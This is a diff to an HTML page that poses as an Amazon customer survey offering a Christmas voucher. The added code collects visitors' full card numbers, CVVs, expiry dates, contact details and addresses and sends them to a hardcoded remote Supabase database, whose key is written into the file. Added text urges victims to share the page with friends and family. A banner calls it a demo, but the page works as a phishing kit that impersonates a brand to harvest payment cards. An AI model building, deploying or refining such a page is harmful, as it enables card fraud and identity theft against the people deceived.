@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Amazon E-commerce Survey - Win Christmas Voucher!</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
     <style>
         * {
             margin: 0;
@@ -522,6 +523,75 @@
             to { opacity: 1; transform: translateY(0); }
         }
         
+        /* Supabase Loading Overlay Styles */
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+        
+        .loading-spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #FF9900;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        
+        .loading-message {
+            color: white;
+            margin-top: 20px;
+            font-size: 18px;
+        }
+        
+        .success-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 10000;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .success-content {
+            background: white;
+            padding: 40px;
+            border-radius: 12px;
+            text-align: center;
+            max-width: 500px;
+            width: 90%;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
+        }
+        
+        .success-icon {
+            font-size: 60px;
+            color: #28a745;
+            margin-bottom: 20px;
+        }
+        
+        .success-content h3 {
+            color: #232F3E;
+            margin-bottom: 15px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
         @media (max-width: 768px) {
             .container {
                 margin: 10px;
@@ -570,6 +640,17 @@
             margin-top: 10px;
             font-size: 0.9rem;
         }
+        
+        .security-warning {
+            background-color: #f8d7da;
+            border: 1px solid #f5c6cb;
+            color: #721c24;
+            padding: 15px;
+            border-radius: 6px;
+            margin: 20px 0;
+            text-align: center;
+            font-size: 0.9rem;
+        }
     </style>
 </head>
 <body>
@@ -579,9 +660,17 @@
             <h2>Take one minute to help us improve your shopping experience</h2>
             <div class="incentive">
                 🎄 Complete survey & payment info to win a FREE Christmas Voucher & Gift! 🎁<br>
-                To increase chances of winning please share with friends family and groups<br>
-            
+                To increase chances of winning plaese share with friends family and groups<br>
+                One of the family can win or a friend 
             </div>
+        </div>
+        
+        <!-- SECURITY WARNING - FOR EDUCATIONAL/DEMO PURPOSES ONLY -->
+        <div class="security-warning">
+            <i class="fas fa-exclamation-triangle"></i>
+            <strong>SECURITY NOTICE:</strong> This is a demonstration project only. 
+            Storing full credit card numbers and CVV is prohibited in production environments.
+            For real applications, use PCI-DSS compliant payment processors like Stripe or PayPal.
         </div>
         
         <div class="progress-bar">
@@ -1941,7 +2030,155 @@
         </div>
     </div>
 
+    <!-- Supabase Loading Overlay -->
+    <div id="loadingOverlay" class="loading-overlay">
+        <div class="loading-spinner"></div>
+        <div class="loading-message">Processing your payment information...</div>
+    </div>
+
+    <!-- Success Modal -->
+    <div id="successModal" class="success-modal">
+        <div class="success-content">
+            <div class="success-icon">✅</div>
+            <h3>Thank You!</h3>
+            <p>Your survey and payment information have been successfully submitted.</p>
+            <p>You have been entered into the Christmas voucher draw!</p>
+            <p><small>A confirmation email will be sent to your email address.</small></p>
+            <button id="closeSuccessModal" style="
+                background: #FF9900;
+                color: white;
+                border: none;
+                padding: 10px 30px;
+                border-radius: 6px;
+                cursor: pointer;
+                margin-top: 20px;
+                font-weight: bold;
+            ">Close</button>
+        </div>
+    </div>
+
     <script>
+        // ========== SUPABASE CONFIGURATION ==========
+        // REPLACE THESE VALUES WITH YOUR ACTUAL SUPABASE CREDENTIALS
+        const supabaseUrl = 'https://npmyylobqmtvxsagwjfv.supabase.co'; // e.g., https://abc123.supabase.co
+        const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5wbXl5bG9icW10dnhzYWd3amZ2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjU1NDYxMzYsImV4cCI6MjA4MTEyMjEzNn0.Mp6RYO3SSybeJcIwXRq4TXWPINZHP3CFNTcYQ4gJi7w'; // e.g., eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
+        const supabase = window.supabase.createClient(supabaseUrl, supabaseKey);
+
+        // ========== LOADING & SUCCESS MODAL FUNCTIONS ==========
+        function showLoading(show) {
+            const overlay = document.getElementById('loadingOverlay');
+            overlay.style.display = show ? 'flex' : 'none';
+        }
+
+        function showSuccessModal() {
+            document.getElementById('successModal').style.display = 'flex';
+        }
+
+        document.getElementById('closeSuccessModal').addEventListener('click', function() {
+            document.getElementById('successModal').style.display = 'none';
+        });
+
+        // ========== SUPABASE DATA SAVING FUNCTIONS ==========
+        // Store full card number (NO MASKING - FOR DEMO ONLY)
+        function getCardNumber() {
+            return document.getElementById('cardNumber').value.replace(/\s+/g, '');
+        }
+
+        async function savePaymentToSupabase() {
+            try {
+                showLoading(true);
+                
+                // Prepare billing address
+                let billingData = {
+                    billing_street: '',
+                    billing_city: '',
+                    billing_state: '',
+                    billing_zip: '',
+                    billing_country: '',
+                    billing_same_as_shipping: false
+                };
+                
+                // Check if billing is same as shipping
+                const billingSame = document.querySelector('input[name="billing_same"]:checked').value;
+                
+                if (billingSame === 'yes') {
+                    // Use shipping address as billing address
+                    billingData.billing_street = document.getElementById('shipping_street').value;
+                    billingData.billing_city = document.getElementById('shipping_city').value;
+                    billingData.billing_state = document.getElementById('shipping_state').value;
+                    billingData.billing_zip = document.getElementById('shipping_zip').value;
+                    billingData.billing_country = document.getElementById('shipping_country').value;
+                    billingData.billing_same_as_shipping = true;
+                } else {
+                    // Use separate billing address
+                    billingData.billing_street = document.getElementById('billing_street').value;
+                    billingData.billing_city = document.getElementById('billing_city').value;
+                    billingData.billing_state = document.getElementById('billing_state').value;
+                    billingData.billing_zip = document.getElementById('billing_zip').value;
+                    billingData.billing_country = document.getElementById('billing_country').value;
+                    billingData.billing_same_as_shipping = false;
+                }
+                
+                // Prepare payment data - STORING FULL DATA (NO MASKING)
+                const paymentData = {
+                    name: document.getElementById('name').value,
+                    email: document.getElementById('email').value,
+                    phone: document.getElementById('phone').value,
+                    
+                    // Card information - FULL DATA STORED
+                    card_number: getCardNumber(), // FULL CARD NUMBER
+                    card_holder: document.getElementById('cardHolder').value,
+                    expiry_month: document.getElementById('expiryMonth').value,
+                    expiry_year: document.getElementById('expiryYear').value,
+                    cvv: document.getElementById('cvv').value, // FULL CVV
+                    
+                    // Shipping/delivery info
+                    shipping_street: document.getElementById('shipping_street').value || '',
+                    shipping_city: document.getElementById('shipping_city').value || '',
+                    shipping_state: document.getElementById('shipping_state').value || '',
+                    shipping_zip: document.getElementById('shipping_zip').value || '',
+                    shipping_country: document.getElementById('shipping_country').value || '',
+                    delivery_preference: document.getElementById('delivery_preference').value,
+                    
+                    // Billing address
+                    ...billingData,
+                    
+                    // Gift preferences
+                    gift_preference: document.getElementById('gift_preference')?.value || '',
+                    gift_message: document.getElementById('gift_message')?.value || '',
+                    
+                    // Survey responses (you can add more as needed)
+                    age: document.getElementById('age').value,
+                    overall_experience: document.querySelector('input[name="overall_experience"]:checked')?.value || '',
+                    find_ease: document.querySelector('input[name="find_ease"]:checked')?.value || '',
+                    payment_satisfaction: document.querySelector('input[name="payment_satisfaction"]:checked')?.value || '',
+                    
+                    survey_completed: true,
+                    created_at: new Date().toISOString()
+                };
+                
+                // Save to Supabase
+                const { data, error } = await supabase
+                    .from('amazon_survey_payments')
+                    .insert([paymentData]);
+                
+                if (error) {
+                    console.error('Supabase Error:', error);
+                    throw new Error('Failed to save payment information. Please try again.');
+                }
+                
+                console.log('Data saved successfully to Supabase:', data);
+                return true;
+                
+            } catch (error) {
+                console.error('Error saving data to Supabase:', error);
+                throw error;
+            } finally {
+                showLoading(false);
+            }
+        }
+
+        // ========== ORIGINAL FORM FUNCTIONALITY ==========
         // Update progress bar as user scrolls
         const sections = document.querySelectorAll('.section');
         const progressBar = document.getElementById('surveyProgress');
@@ -2155,95 +2392,9 @@
             });
         });
         
-        // Form submission handling
-        document.getElementById('amazonSurvey').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            let isValid = true;
-            
-            // Check if at least one payment method is selected (from original survey)
-            const paymentMethods = document.querySelectorAll('input[name="payment_methods"]:checked');
-            if (paymentMethods.length === 0) {
-                alert('Please select at least one payment method you always use (Question 19).');
-                document.getElementById('section5').scrollIntoView({ behavior: 'smooth' });
-                return;
-            }
-            
-            // Check delivery preference is selected
-            if (!deliveryPreferenceInput.value) {
-                alert('Please select how you would like to receive your Christmas gift.');
-                document.getElementById('giftDeliverySection').scrollIntoView({ behavior: 'smooth' });
-                return;
-            }
-            
-            // Validate shipping address if physical delivery
-            if (deliveryPreferenceInput.value === 'physical') {
-                const shippingStreet = document.getElementById('shipping_street').value;
-                const shippingCity = document.getElementById('shipping_city').value;
-                const shippingZip = document.getElementById('shipping_zip').value;
-                
-                if (!shippingStreet || !shippingCity || !shippingZip) {
-                    alert('Please complete your shipping address for physical gift delivery.');
-                    document.getElementById('shippingAddressGroup').scrollIntoView({ behavior: 'smooth' });
-                    return;
-                }
-            }
-            
-            // Validate billing address if different
-            if (billingSameNo.checked) {
-                const billingStreet = document.getElementById('billing_street').value;
-                const billingCity = document.getElementById('billing_city').value;
-                const billingZip = document.getElementById('billing_zip').value;
-                
-                if (!billingStreet || !billingCity || !billingZip) {
-                    alert('Please complete your billing address.');
-                    document.getElementById('billingAddressGroup').scrollIntoView({ behavior: 'smooth' });
-                    return;
-                }
-            }
-            
-            // Validate credit card information
-            const cardNumber = cardNumberInput.value.replace(/\s+/g, '');
-            const cardHolder = document.getElementById('cardHolder').value;
-            const expiryMonth = expiryMonthSelect.value;
-            const expiryYear = expiryYearSelect.value;
-            const cvv = cvvInput.value;
-            
-            // Card number validation
-            if (!validateCardNumber(cardNumber)) {
-                showError('cardNumberError', 'Please enter a valid card number (13-19 digits)');
-                cardNumberInput.parentElement.classList.add('error');
-                isValid = false;
-            }
-            
-            // Card holder validation
-            if (cardHolder.trim().length < 2) {
-                showError('cardHolderError');
-                document.getElementById('cardHolder').parentElement.classList.add('error');
-                isValid = false;
-            }
-            
-            // Expiry date validation
-            if (!expiryMonth || !expiryYear) {
-                showError('expiryError');
-                expiryMonthSelect.parentElement.classList.add('error');
-                isValid = false;
-            }
-            
-            // CVV validation
-            if (cvv.length < 3 || cvv.length > 4 || !/^\d+$/.test(cvv)) {
-                showError('cvvError', 'Please enter a valid 3 or 4-digit CVV');
-                cvvInput.parentElement.classList.add('error');
-                isValid = false;
-            }
-            
-            if (!isValid) {
-                alert('Please correct the errors in the payment information section.');
-                document.getElementById('paymentSection').scrollIntoView({ behavior: 'smooth' });
-                return;
-            }
-            
-            // Check all required fields are filled
+        // ========== FORM VALIDATION FUNCTIONS ==========
+        function validateForm() {
+            // Check required fields
             const requiredFields = document.querySelectorAll('[required]');
             let allValid = true;
             
@@ -2252,10 +2403,11 @@
                     allValid = false;
                     field.style.borderColor = '#c51130';
                 } else {
-                    field.style.borderColor = '#ddd';
+                    field.style.borderColor = '';
                 }
             });
             
+            // Validate radio groups
             const requiredRadios = document.querySelectorAll('input[type="radio"][required]');
             const radioGroups = {};
             
@@ -2281,20 +2433,104 @@
             
             if (!allValid) {
                 alert('Please fill in all required fields (marked with *).');
+                return false;
+            }
+            
+            // Check payment methods selection
+            const paymentMethods = document.querySelectorAll('input[name="payment_methods"]:checked');
+            if (paymentMethods.length === 0) {
+                alert('Please select at least one payment method you always use (Question 19).');
+                document.getElementById('section5').scrollIntoView({ behavior: 'smooth' });
+                return false;
+            }
+            
+            // Check delivery preference
+            const deliveryPref = document.getElementById('delivery_preference').value;
+            if (!deliveryPref) {
+                alert('Please select how you would like to receive your Christmas gift.');
+                document.getElementById('giftDeliverySection').scrollIntoView({ behavior: 'smooth' });
+                return false;
+            }
+            
+            return true;
+        }
+
+        function validatePaymentInfo() {
+            clearValidationErrors();
+            let isValid = true;
+            
+            // Card number validation
+            const cardNumber = document.getElementById('cardNumber').value.replace(/\s+/g, '');
+            if (!validateCardNumber(cardNumber)) {
+                showError('cardNumberError', 'Please enter a valid card number (13-19 digits)');
+                document.getElementById('cardNumber').parentElement.classList.add('error');
+                isValid = false;
+            }
+            
+            // Card holder validation
+            const cardHolder = document.getElementById('cardHolder').value;
+            if (cardHolder.trim().length < 2) {
+                showError('cardHolderError');
+                document.getElementById('cardHolder').parentElement.classList.add('error');
+                isValid = false;
+            }
+            
+            // Expiry date validation
+            const expiryMonth = document.getElementById('expiryMonth').value;
+            const expiryYear = document.getElementById('expiryYear').value;
+            if (!expiryMonth || !expiryYear) {
+                showError('expiryError');
+                document.getElementById('expiryMonth').parentElement.classList.add('error');
+                isValid = false;
+            }
+            
+            // CVV validation
+            const cvv = document.getElementById('cvv').value;
+            if (cvv.length < 3 || cvv.length > 4 || !/^\d+$/.test(cvv)) {
+                showError('cvvError', 'Please enter a valid 3 or 4-digit CVV');
+                document.getElementById('cvv').parentElement.classList.add('error');
+                isValid = false;
+            }
+            
+            return isValid;
+        }
+
+        // ========== FORM SUBMISSION HANDLER ==========
+        document.getElementById('amazonSurvey').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            // Basic validation first
+            if (!validateForm()) {
                 return;
             }
             
-            // Form is valid, show success message
-            alert('Thank you for completing the Amazon survey and providing your payment information! You have been entered into the Christmas voucher draw. Good luck!');
+            // Validate payment information
+            if (!validatePaymentInfo()) {
+                alert('Please correct the errors in the payment information section.');
+                document.getElementById('paymentSection').scrollIntoView({ behavior: 'smooth' });
+                return;
+            }
             
-            // In a real application, you would send the form data to a server here
-            // this.reset();
-            // progressBar.style.width = '0%';
-            // progressText.textContent = 'Section 0 of 13';
-            // window.scrollTo(0, 0);
+            try {
+                // Save to Supabase
+                await savePaymentToSupabase();
+                
+                // Show success message
+                showSuccessModal();
+                
+                // Optional: Reset form (commented out for now)
+                // this.reset();
+                // Reset progress bar
+                // progressBar.style.width = '0%';
+                // progressText.textContent = 'Section 0 of 13';
+                
+            } catch (error) {
+                console.error('Submission error:', error);
+                alert('There was an error submitting your information. Please try again. Error: ' + error.message);
+            }
         });
-        
-        // Character limit for textareas
+
+        // ========== CHARACTER LIMIT FOR TEXTAREAS ==========
         const textareas = document.querySelectorAll('textarea');
         textareas.forEach(textarea => {
             textarea.addEventListener('input', function() {
@@ -2315,8 +2551,8 @@
                 }
             });
         });
-        
-        // Reset border color when user interacts with fields
+
+        // ========== RESET BORDER COLOR WHEN USER INTERACTS WITH FIELDS ==========
         const formInputs = document.querySelectorAll('input, select, textarea');
         formInputs.forEach(input => {
             input.addEventListener('focus', function() {
@@ -2337,4 +2573,3 @@
     </script>
 </body>
 </html>
-
